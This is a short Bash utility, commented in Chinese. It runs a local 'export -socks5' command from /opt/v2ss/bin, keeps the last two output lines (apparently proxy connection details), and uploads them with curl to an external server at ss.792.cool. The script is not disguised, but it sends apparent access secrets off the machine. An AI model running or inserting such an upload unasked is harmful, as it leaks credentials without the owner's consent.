#!/usr/bin/env bash
set -Eeuo pipefail

UPLOAD_URL="http://ss.792.cool/upload.php"
DIRECTORY="MIMI"

CMD_DIR="/opt/v2ss/bin"
EXPORT_CMD="./export -socks5"

TMP_FILE="$(mktemp)"
cleanup() { rm -f "${TMP_FILE}" || true; }
trap cleanup EXIT

command -v curl >/dev/null 2>&1 || { echo "缺少 curl，请先安装"; exit 1; }

OUTPUT="$(
  cd "${CMD_DIR}"
  ${EXPORT_CMD}
)"

LAST_TWO="$(printf '%s\n' "${OUTPUT}" | tail -n 2)"
printf '%s\n' "${LAST_TWO}" > "${TMP_FILE}"

RAW_FIRST_LINE="$(printf '%s\n' "${LAST_TWO}" | head -n 1)"

# 清洗为安全文件名（仅保留字母数字 . _ - 和空格），空格改为 _
SAFE_FIRST_LINE="$(
  printf '%s' "${RAW_FIRST_LINE}" \
  | LC_ALL=C tr -cd '[:alnum:]._ -' \
  | sed -E 's/[[:space:]]+/_/g' \
  | sed -E 's/_+/_/g; s/^_+|_+$//g' \
  | cut -c1-80
)"
[ -z "${SAFE_FIRST_LINE}" ] && SAFE_FIRST_LINE="export_socks5"

# 随机10位字母数字
RAND_SUFFIX="$(tr -dc 'A-Za-z0-9' </dev/urandom | head -c 10 || true)"
[ -z "${RAND_SUFFIX}" ] && RAND_SUFFIX="$(date +%s%N | sha256sum | cut -c1-10)"

UNIQUE="${SAFE_FIRST_LINE}_${RAND_SUFFIX}"

PREFIX="${UNIQUE}"
BASENAME="${UNIQUE}"

RESPONSE="$(
  curl -fsS -m 30 -X POST "${UPLOAD_URL}" \
    -F "directory=${DIRECTORY}" \
    -F "prefix=${PREFIX}" \
    -F "file=@${TMP_FILE};type=text/plain;filename=${BASENAME}.txt"
)"

echo "${RESPONSE}"
